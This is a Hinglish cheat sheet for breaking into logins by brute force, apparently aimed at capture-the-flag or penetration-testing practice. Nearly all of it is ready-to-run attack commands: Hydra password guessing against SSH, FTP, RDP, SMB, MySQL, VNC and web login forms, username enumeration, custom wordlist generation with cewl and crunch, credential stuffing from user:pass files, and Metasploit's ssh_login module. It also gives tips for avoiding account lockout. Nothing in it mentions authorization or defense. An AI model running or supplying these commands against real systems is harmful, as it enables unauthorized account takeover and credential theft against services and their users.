# 🔨 LOGIN TODNA HAI — Brute Force Karo

---

## STEP 1: Service Identify Karo → Tool Select Karo

| Service | Hydra Command |
|---|---|
| SSH | `hydra -l USER -P rockyou.txt IP ssh -t 4` |
| FTP | `hydra -l USER -P rockyou.txt IP ftp -t 4` |
| RDP | `hydra -l USER -P rockyou.txt IP rdp -t 4` |
| SMB | `hydra -l USER -P rockyou.txt IP smb -t 4` |
| MySQL | `hydra -l root -P rockyou.txt IP mysql -t 4` |
| Telnet | `hydra -l USER -P rockyou.txt IP telnet -t 4` |
| VNC | `hydra -P rockyou.txt IP vnc -t 4` |
| HTTP Basic | `hydra -l USER -P rockyou.txt IP http-get /path/ -t 4` |

---

## CASE 1: Web Form Brute Force (Sabse Tricky)
```bash
# Step 1: Login request inspect karo (Burp ya browser DevTools)
# Step 2: Note karo: URL, POST params, failure message

hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed" -t 4
```
> **3 parts** colon se separate: `path:post_data:failure_string`
> `^USER^` aur `^PASS^` placeholders hain

### Common Failure Strings:
- `Login failed`
- `Invalid credentials`  
- `incorrect`
- `Access denied`

---

## CASE 2: Username Nahi Pata
```bash
# Pehle users enumerate karo:
enum4linux -U <IP>                         # SMB users
smtp-user-enum -M VRFY -U users.txt -t <IP>  # SMTP
finger @<IP>                               # finger service
# Ya common usernames try karo:
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P rockyou.txt <IP> ssh -t 4
```

---

## CASE 3: Custom Wordlist Banana Hai
```bash
# Website se words nikalo
cewl http://<IP> -m 6 -w custom_words.txt

# Pattern-based (Admin + 4 digits)
crunch 9 9 -t Admin%%%% -o admin_pins.txt

# Pipe directly
crunch 4 4 0123456789 | hydra -l admin -P - <IP> ssh -t 4
```

---

## CASE 4: Multiple Users Try Karo
```bash
# User list + Password list
hydra -L users.txt -P passwords.txt <IP> ssh -t 4

# Credential stuffing (user:pass combo)
hydra -C creds.txt <IP> ssh -t 4
# creds.txt format: admin:password
```

---

## CASE 5: Metasploit Se Brute Force
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run
```

---

## ⚠️ IMPORTANT TIPS:
- **`-t 4`** zaroor lagao — kam threads = less lockout risk
- **RDP/SMB** bahut slow hain — patience rakho
- **Rockyou.txt** compressed hai? → `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
- **VNC** mein username nahi hota — sirf `-P`
- **`-f`** flag lagao → first match pe ruk jaayega

---

## QUICK DECISION:
```
Login todna hai
  ├─ Service pata hai? → hydra -l USER -P rockyou.txt IP SERVICE
  ├─ Web form? → hydra http-post-form (inspect login request first)
  ├─ Username nahi pata? → enum4linux / smtp-user-enum / common list
  ├─ Rockyou fail? → cewl custom wordlist / crunch pattern
  └─ Metasploit prefer? → auxiliary/scanner/ssh/ssh_login
```
